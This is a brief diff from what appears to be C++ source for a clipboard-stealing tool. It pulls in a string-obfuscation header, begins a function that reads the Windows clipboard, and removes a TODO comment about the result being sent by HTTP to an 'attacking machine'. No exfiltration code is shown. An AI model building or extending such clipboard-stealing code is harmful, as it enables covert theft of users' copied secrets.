@@ -4,7 +4,6 @@
 #include <obfstr.h>
 
 // Extracting in UTF_16 format, Windows console could not show it properly
-// TODO test if final result after HTTP call to attacking machine is correctly formatted for all symbols
 std::string GetClipboardText()
 {
     if(!OpenClipboard(nullptr))
